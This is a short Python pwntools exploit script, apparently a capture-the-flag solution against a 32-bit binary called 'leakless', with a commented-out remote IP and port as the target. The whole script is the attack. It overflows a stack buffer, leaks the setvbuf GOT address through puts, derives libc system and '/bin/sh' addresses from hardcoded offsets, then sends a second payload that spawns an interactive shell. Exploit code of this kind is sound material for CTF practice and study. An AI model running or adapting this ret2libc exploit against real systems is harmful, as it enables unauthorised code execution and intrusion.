from pwn import *

elf = ELF("./leakless")
p = process("./leakless");
#p = remote("35.243.188.20", 2002)

for symbol in elf.symbols:
	#if symbol=='setvbuf' or symbol=='got.setvbuf':
	print symbol, hex(elf.symbols[symbol])

puts_plt = elf.symbols['plt.puts']
main = elf.symbols['main']
setvbuf_got = elf.symbols['got.setvbuf']
setvbuf_offset = 0x060360
system_offset = 0x03ada0 - setvbuf_offset
binsh_offset = 0x15ba0b - setvbuf_offset

buf = 'A'*(72+4)
eip = p32(puts_plt)
ret = p32(main)
argv = p32(setvbuf_got)

payload = buf + eip + ret + argv
p.sendline(payload)

setvbuf_leak = u32(p.recv()[:4])
system_leak = setvbuf_leak + system_offset
binsh_leak = setvbuf_leak + binsh_offset

payload = buf+p32(system_leak)+'PPPP'+p32(binsh_leak)
p.sendline(payload)
p.interactive()
#print hex(puts_offset)
